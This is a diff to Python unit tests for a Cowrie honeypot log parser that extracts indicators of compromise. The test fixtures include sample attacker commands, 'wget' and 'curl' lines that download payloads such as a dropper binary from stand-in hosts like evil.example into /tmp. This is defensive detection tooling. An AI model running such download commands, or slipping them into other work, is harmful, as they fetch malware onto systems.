@@ -36,6 +36,33 @@ class CowrieParserTests(unittest.TestCase):
         self.assertEqual(indicators["ip_addresses"], ["198.51.100.24"])
         self.assertEqual(indicators["commands"], ["wget http://bad.example/payload.sh"])
         self.assertEqual(indicators["urls"], ["http://bad.example/payload.sh"])
+        self.assertEqual(indicators["domains"], ["bad.example"])
+        self.assertEqual(indicators["payload_references"], ["http://bad.example/payload.sh"])
+
+    def test_extracts_richer_indicators_from_command_text(self) -> None:
+        lines = [
+            '{"timestamp":"2026-03-18T12:06:00.000000Z","eventid":"cowrie.command.input",'
+            '"src_ip":"198.51.100.24","session":"abc125",'
+            '"input":"curl http://evil.example/dropper.elf -o /tmp/dropper.elf && echo '
+            'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 192.0.2.44"}'
+        ]
+
+        [event] = list(iter_normalized_cowrie_events(lines))
+        indicators = extract_indicators(event)
+
+        self.assertIn("192.0.2.44", indicators["ip_addresses"])
+        self.assertIn("evil.example", indicators["domains"])
+        self.assertIn("/tmp/dropper.elf", indicators["file_paths"])
+        self.assertIn("http://evil.example/dropper.elf", indicators["payload_references"])
+        self.assertEqual(
+            indicators["hashes"],
+            [
+                {
+                    "type": "sha256",
+                    "value": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+                }
+            ],
+        )
 
     def test_rejects_invalid_json_line(self) -> None:
         with self.assertRaisesRegex(ValueError, "Invalid JSON on line 1"):
@@ -44,4 +71,3 @@ class CowrieParserTests(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
-
